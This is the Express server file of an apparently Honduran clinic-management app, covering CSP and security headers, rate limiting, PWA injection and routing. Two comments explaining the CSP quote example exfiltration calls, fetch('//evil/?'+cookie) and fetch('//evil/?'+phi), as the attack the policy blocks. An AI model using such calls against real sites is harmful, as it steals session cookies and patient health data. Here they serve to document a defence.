require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const compression = require('compression');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const { initDb } = require('./db');

process.env.TZ = 'America/Tegucigalpa'; // Zona horaria de Honduras (CST, UTC-6, sin horario de verano)

const app = express();

// Confiar en proxy de Render para que req.ip refleje la IP real del cliente
// (necesario para que express-rate-limit no agrupe a todo el mundo bajo la IP del LB).
app.set('trust proxy', 1);

// Cache-busting: every deploy changes ASSET_VERSION, which gets appended as ?v=…
// to every local <script src> and <link href>. Browsers then fetch fresh copies
// without users needing a hard refresh. Render exposes RENDER_GIT_COMMIT per deploy.
const ASSET_VERSION =
  (process.env.RENDER_GIT_COMMIT || '').slice(0, 8) || String(Date.now());

const PUBLIC_DIR = path.join(__dirname, 'public');

// Helmet aplica HSTS, X-Frame-Options DENY, X-Content-Type-Options, Referrer-Policy, etc.
// CSP: bloquea cargas de scripts/estilos remotos y restringe fetch a same-origin.
// 'unsafe-inline' está permitido porque el frontend usa muchos onclick="" y <style>;
// migrar a CSP estricta (con nonces) requeriría refactor mayor del frontend.
// La protección clave aquí es connect-src 'self' → un XSS no puede hacer
// fetch('//evil/?'+cookie) porque la cookie es HttpOnly y connect-src bloquea
// destinos cross-origin para exfiltración alternativa.
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      // Allowlist de CDNs que la app usa: Quill (editor de consentimientos), QR generator,
      // React+Babel (ortodoncia/periodoncia). Cualquier nuevo CDN debe agregarse aquí.
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://cdn.quilljs.com",
        "https://cdn.jsdelivr.net",
        "https://unpkg.com",
      ],
      // helmet pone script-src-attr: 'none' por default (bloquearía onclick="…"),
      // la app actual depende mucho de event handlers inline → relajado a unsafe-inline.
      // TODO en una segunda iteración: migrar a addEventListener y endurecer.
      scriptSrcAttr: ["'unsafe-inline'"],
      // Service Worker (/sw.js) de la PWA. worker-src cae a script-src por
      // defecto, pero lo declaramos explícito para que quede claro y a prueba de
      // cambios futuros en los defaults de helmet.
      workerSrc: ["'self'"],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com",
        "https://cdn.quilljs.com",
        // cdn.quilljs.com hace 301 → cdn.jsdelivr.net; el CSP revalida el destino
        // del redirect, así que jsdelivr debe estar permitido o quill.snow.css se
        // bloquea y el editor sale sin estilos (íconos SVG gigantes). scriptSrc ya
        // lo permite, por eso el JS de Quill sí cargaba y el CSS no.
        "https://cdn.jsdelivr.net",
        "https://unpkg.com", // Leaflet CSS para /mapa
      ],
      fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],
      // tile.openstreetmap.org → tiles del mapa público /mapa.
      // unpkg.com → markers PNG que Leaflet referencia desde su CSS.
      imgSrc: [
        "'self'", "data:", "blob:",
        "https://res.cloudinary.com",
        "https://*.tile.openstreetmap.org",
        "https://unpkg.com",
      ],
      // connect-src 'self' es la pieza clave: aunque un XSS sortee 'unsafe-inline',
      // no podrá exfiltrar datos via fetch('//evil/?'+phi) — el browser bloquea
      // cualquier destino que no sea el mismo origen.
      connectSrc: ["'self'"],
      // 'self' (no 'none') porque consultation-orthodontics.html embebe
      // /ortodoncia-design/index.html en un iframe same-origin. Sigue
      // bloqueando que terceros embeban la app → defensa de clickjacking.
      frameAncestors: ["'self'"],
      // Qué iframes puede embeber NUESTRA app. Sin esto, las landings de las
      // clínicas no podrían mostrar el mapa de Google Maps en /c/<slug>.
      frameSrc: ["'self'", "https://www.google.com", "https://maps.google.com"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null,
    },
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  // sameorigin (no deny): legacy X-Frame-Options para navegadores viejos,
  // mismo criterio que frameAncestors arriba.
  frameguard: { action: 'sameorigin' },
}));

// Forzar HTTPS en producción (Render termina TLS en el LB).
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' &&
      req.headers['x-forwarded-proto'] &&
      req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, 'https://' + req.headers.host + req.url);
  }
  next();
});

// ── Inyección PWA (manifest + iconos + registro del Service Worker) ──
// Se inyecta server-side en TODA respuesta HTML (todas pasan por aquí), así las
// ~47 páginas quedan instalables como app sin tocar archivo por archivo. La
// inyección es idempotente: si la página ya trae <link rel="manifest"> se omite.
// ?v=ASSET_VERSION en los iconos: sin esto, el icono se sirve con max-age=1d en
// la MISMA URL, así que Safari/Render entregan el viejo tras un cambio de marca.
// Versionar la URL fuerza una descarga fresca en cada deploy (clave en iOS, que
// además congela el icono al "Añadir a inicio": hay que re-añadir con el nuevo).
const PV = '?v=' + ASSET_VERSION;
const PWA_HEAD_TAGS =
  '\n    <link rel="manifest" href="/manifest.webmanifest' + PV + '">' +
  '\n    <link rel="icon" href="/icons/favicon.ico' + PV + '" sizes="32x32">' +
  '\n    <link rel="icon" type="image/png" sizes="192x192" href="/icons/icon-192.png' + PV + '">' +
  '\n    <link rel="apple-touch-icon" href="/icons/apple-touch-icon.png' + PV + '">' +
  '\n    <link rel="apple-touch-icon" sizes="167x167" href="/icons/apple-touch-icon-167.png' + PV + '">' +
  '\n    <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152.png' + PV + '">' +
  '\n    <meta name="application-name" content="Salud Digital">' +
  '\n    <meta name="apple-mobile-web-app-title" content="Salud Digital">' +
  '\n    <script>' +
  "if('serviceWorker' in navigator){window.addEventListener('load',function(){" +
  "navigator.serviceWorker.register('/sw.js',{scope:'/'}).catch(function(){});});}" +
  '</script>';

function injectPwaTags(html) {
  // \s*=\s* tolera variantes de formato (rel = "manifest") y evita duplicar.
  if (/rel\s*=\s*["']manifest["']/i.test(html)) return html; // ya presente
  const idx = html.search(/<\/head>/i);
  if (idx === -1) return html; // sin <head> (fragmento) → no tocar
  let extra = PWA_HEAD_TAGS;
  // Standalone en iOS/Android: añade los meta de "capable" que falten.
  if (!/name\s*=\s*["']apple-mobile-web-app-capable["']/i.test(html)) {
    extra += '\n    <meta name="apple-mobile-web-app-capable" content="yes">';
  }
  if (!/name\s*=\s*["']mobile-web-app-capable["']/i.test(html)) {
    extra += '\n    <meta name="mobile-web-app-capable" content="yes">';
  }
  // theme-color por ESQUEMA, no un color fijo. En standalone (iOS 15+ y
  // Android) el sistema pinta con esto la franja de la status bar, y la lee al
  // ARRANCAR: theme.js la actualiza después, pero para entonces la franja ya
  // está pintada. Con un único valor de marca, en modo oscuro quedaba una banda
  // clara pegada arriba que no responde a ningún CSS nuestro.
  // Se deja el estilo de status bar en "default" a propósito: con
  // "black-translucent" iOS fuerza el texto de la status bar a BLANCO, que
  // sobre el vidrio claro del tema light es ilegible.
  if (!/name\s*=\s*["']theme-color["']/i.test(html)) {
    extra +=
      '\n    <meta name="theme-color" content="#f8fafc" media="(prefers-color-scheme: light)">' +
      '\n    <meta name="theme-color" content="#050507" media="(prefers-color-scheme: dark)">';
  }
  return html.slice(0, idx) + extra + '\n  ' + html.slice(idx);
}

// Garantiza viewport-fit=cover en el <meta viewport> del HTML SERVIDO. iOS solo
// respeta el safe-area (notch / Dynamic Island) si viewport-fit=cover está en el
// HTML inicial; inyectarlo por JS después del render no es fiable. Varias páginas
// traían el viewport sin él → por eso "a veces" la barra superior pisaba el notch.
function ensureViewportFit(html) {
  return html.replace(/<meta\b[^>]*name\s*=\s*["']viewport["'][^>]*>/i, (tag) => {
    if (/viewport-fit/i.test(tag)) return tag; // ya lo trae
    return tag.replace(
      /(content\s*=\s*["'])([^"']*)(["'])/i,
      (m, pre, val, post) => pre + val.replace(/\s*$/, '') + ', viewport-fit=cover' + post,
    );
  });
}

function serveHtmlWithVersion(filePath, res) {
  fs.readFile(filePath, 'utf8', (err, raw) => {
    if (err) {
      res.status(404).end();
      return;
    }
    const html = raw
      .replace(
        /(<script\b[^>]*\bsrc=")(\/[^"?#]+\.jsx?)(")/gi,
        `$1$2?v=${ASSET_VERSION}$3`,
      )
      .replace(
        /(<link\b[^>]*\bhref=")(\/[^"?#]+\.(?:css|js))(")/gi,
        `$1$2?v=${ASSET_VERSION}$3`,
      );
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(injectPwaTags(ensureViewportFit(html)));
  });
}

// Serve the public confirmation page under /confirmar/:token (la página lee el
// token de location.pathname y llama a /api/confirmations/public/:token).
app.get(/^\/confirmar\/[a-f0-9]{32}$/i, (req, res) => {
  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'confirm.html'), res);
});

// Landing pública por clínica: /c/<slug> sirve siempre el mismo template HTML,
// que luego pide /api/public/landing/<slug> para hidratar los datos. El slug se
// valida en el endpoint API; aquí solo verificamos shape para no servir el HTML
// ante rutas raras.
app.get(/^\/c\/[a-z0-9](?:[a-z0-9-]{1,38}[a-z0-9])?$/i, (req, res) => {
  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'clinic-landing.html'), res);
});

// Mapa público de clínicas registradas. Sin auth: cualquiera puede entrar y ver pines.
app.get('/mapa', (req, res) => {
  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'mapa.html'), res);
});

// Manifest dinámico: añade ?v=ASSET_VERSION a las URLs de iconos. Android/Chrome
// cachean el icono del manifest por su URL; sin versión, el icono "pegado" en el
// inicio no se refresca tras cambiar la marca. Se reescribe una vez y se cachea
// en memoria (ASSET_VERSION es constante por proceso). Debe ir ANTES de static.
let MANIFEST_VERSIONED = null;
app.get('/manifest.webmanifest', (req, res) => {
  if (MANIFEST_VERSIONED === null) {
    try {
      MANIFEST_VERSIONED = fs
        .readFileSync(path.join(PUBLIC_DIR, 'manifest.webmanifest'), 'utf8')
        .replace(/("src"\s*:\s*")(\/icons\/[^"?#]+)(")/g, `$1$2?v=${ASSET_VERSION}$3`);
    } catch (_) {
      return res.status(404).end();
    }
  }
  res.setHeader('Content-Type', 'application/manifest+json; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(MANIFEST_VERSIONED);
});

// Intercept *.html requests before express.static so we can inject ?v=… into asset URLs
app.use((req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') return next();
  let urlPath = decodeURIComponent(req.path);
  if (urlPath.endsWith('/')) urlPath += 'index.html';
  if (!urlPath.endsWith('.html')) return next();
  const filePath = path.join(PUBLIC_DIR, urlPath);
  // Path-traversal guard
  if (filePath !== PUBLIC_DIR && !filePath.startsWith(PUBLIC_DIR + path.sep)) {
    return next();
  }
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) return next();
    serveHtmlWithVersion(filePath, res);
  });
});

// gzip/deflate compression — ~5x reduction on the landing HTML
// (most-impactful single change for first paint over slow networks)
app.use(compression({
  threshold: 1024, // only compress responses >= 1KB
  level: 6,
}));

// Límite de payload para mitigar DoS por bodies enormes (multer maneja sus propios límites).
// Excepción: las consultas de ortodoncia embeben fotos clínicas (data URLs base64) dentro de
// odontogram_state, así que su body supera legítimamente el límite global. Un parser específico
// con límite mayor corre antes que el global; express.json se salta si req._body ya existe, por
// lo que el resto de rutas conserva el límite estricto de 256kb.
// El webhook de PayPal necesita el cuerpo EXACTO tal como llegó para verificar
// la firma, así que se captura como Buffer antes de cualquier parser JSON
// (body-parser marca req._body y los parsers de abajo se saltan esta ruta).
app.use('/api/billing/webhook', express.raw({ type: '*/*', limit: '1mb' }));
app.use('/api/consultations', express.json({ limit: '25mb' }));
app.use(express.json({ limit: '256kb' }));
app.use(cookieParser());

// Rate-limit global de baja agresividad para frenar enumeración masiva,
// y un limit más estricto en /api/auth/login que se aplica abajo.
const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 300,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes, intenta de nuevo en un momento.' },
});
app.use('/api/', globalLimiter);

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  message: { error: 'Demasiados intentos de inicio de sesión. Espera 15 minutos.' },
});
app.use('/api/auth/login', authLimiter);

const publicBookingLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas reservas desde esta IP. Intenta más tarde.' },
});
app.use('/api/public/clinic/:clinicId/booking', publicBookingLimiter);

// Limita intentos de adivinar tokens de confirmación o spam de respuestas.
// 60 req/hora por IP es holgado para uso real y frena fuerza bruta.
const publicConfirmLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes. Intenta más tarde.' },
});
app.use('/api/confirmations/public', publicConfirmLimiter);

// Landing pública: GET es generoso (la página carga vía fetch), POST de leads
// más estricto para frenar spam de formulario.
const publicLandingLeadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiados envíos. Intenta más tarde.' },
});
app.use('/api/public/landing/:slug/lead', publicLandingLeadLimiter);

// Static files: hint browsers to cache JS/CSS for a day, HTML always revalidated
const ONE_DAY = 24 * 60 * 60;
app.use(express.static(path.join(__dirname, 'public'), {
  etag: true,
  lastModified: true,
  maxAge: 0,
  // Bloquear archivos sensibles que no deberían exponerse aunque caigan por error en /public
  setHeaders(res, filePath) {
    const base = path.basename(filePath);
    if (base === 'sw.js') {
      // El Service Worker debe revalidarse SIEMPRE para publicar actualizaciones;
      // si se cacheara un día, los usuarios quedarían pegados a un SW viejo.
      res.setHeader('Cache-Control', 'no-cache');
      res.setHeader('Service-Worker-Allowed', '/');
    } else if (/\.webmanifest$/i.test(filePath)) {
      res.setHeader('Content-Type', 'application/manifest+json; charset=utf-8');
      res.setHeader('Cache-Control', 'public, max-age=3600');
    } else if (/\.(?:js|css|svg|woff2?|ttf|otf|png|jpe?g|webp|gif|ico)$/i.test(filePath)) {
      res.setHeader('Cache-Control', 'public, max-age=' + ONE_DAY + ', stale-while-revalidate=' + ONE_DAY);
    } else if (/\.html$/i.test(filePath)) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  },
  // No servir archivos de respaldo, dotfiles, ni ficheros marcados como debug/test
  index: 'index.html',
  dotfiles: 'deny',
  extensions: false,
}));
app.use('/uploads', express.static(path.join(__dirname, 'uploads'), {
  maxAge: '7d',
  etag: true,
  dotfiles: 'deny',
}));

// Guardián de suscripción: sin plan activo, la API queda cerrada (402) salvo
// login, facturación y endpoints públicos. Va ANTES de los routers para que
// cualquier ruta futura quede cubierta sin acordarse de añadir nada.
app.use('/api', require('./middleware/subscription').gate);

app.use('/api/auth', require('./routes/auth'));
app.use('/api/billing', require('./routes/billing'));
app.use('/api/invitations', require('./routes/invitations'));
app.use('/api/clinics', require('./routes/clinics'));
app.use('/api/users', require('./routes/users'));
app.use('/api/patients', require('./routes/patients'));
app.use('/api/consultations', require('./routes/consultations'));
app.use('/api/appointments', require('./routes/appointments'));
app.use('/api/consents', require('./routes/consents'));
app.use('/api/reminders', require('./routes/reminders'));
app.use('/api/confirmations', require('./routes/confirmations'));
app.use('/api/assistant', require('./routes/assistant'));
app.use('/api/assistant', require('./routes/assistant-intent'));
app.use('/api/conversation', require('./routes/conversation'));
app.use('/api/public', require('./routes/public-booking'));
app.use('/api/doctor-availability', require('./routes/doctor-availability'));
app.use('/api/rooms', require('./routes/rooms'));
app.use('/api/reception', require('./routes/reception'));
app.use('/api/inventory', require('./routes/inventory'));
app.use('/api/inventory-usage', require('./routes/inventory-usage'));
app.use('/api/audit', require('./routes/audit'));
app.use('/api/growth', require('./routes/growth'));
app.use('/api/integrations', require('./routes/integrations'));
app.use('/api/media', require('./routes/media'));
app.use('/api/messaging', require('./routes/messaging'));

app.get('*', (req, res) => {
  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'index.html'), res);
});

// Global error handler — never leak stacktraces or raw messages to clients en producción
app.use((err, req, res, next) => {
  console.error('Unhandled route error:', err);
  if (res.headersSent) return next(err);
  const exposeDetail = process.env.NODE_ENV !== 'production';
  res.status(500).json({ error: exposeDetail ? (err.message || 'Internal server error') : 'Internal server error' });
});

const PORT = process.env.PORT || 3000;

(async () => {
  try {
    await initDb();

    // Tarea de retención: audit_logs > 90 días se borran cada 24h.
    // Ejecuta una vez al arrancar y luego en intervalo, no requiere cron externo.
    const AuditService = require('./lib/audit/service');
    const auditSvc = new AuditService();
    const AUDIT_RETENTION_DAYS = parseInt(process.env.AUDIT_RETENTION_DAYS || '90', 10);
    const runPurge = async () => {
      try {
        const r = await auditSvc.purgeOlderThan(AUDIT_RETENTION_DAYS);
        if (r.deleted > 0) console.log(`[audit] purged ${r.deleted} logs > ${r.days}d`);
      } catch (_) {}
    };
    setTimeout(runPurge, 30 * 1000);                // primera corrida 30s después del arranque
    setInterval(runPurge, 24 * 60 * 60 * 1000);     // cada 24 horas

    // Geocodifica al arranque las clínicas que aún no tienen lat/lng. Corre en
    // background respetando el rate limit de Nominatim (1 req/s) y no bloquea listen.
    setTimeout(() => {
      require('./lib/geocoding').backfillMissing()
        .catch(err => console.warn('[geocode-backfill]', err.message));
    }, 5 * 1000);

    app.listen(PORT, () => {
      console.log(`\nSaludDigital running → http://localhost:${PORT}\n`);
    });
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
})();
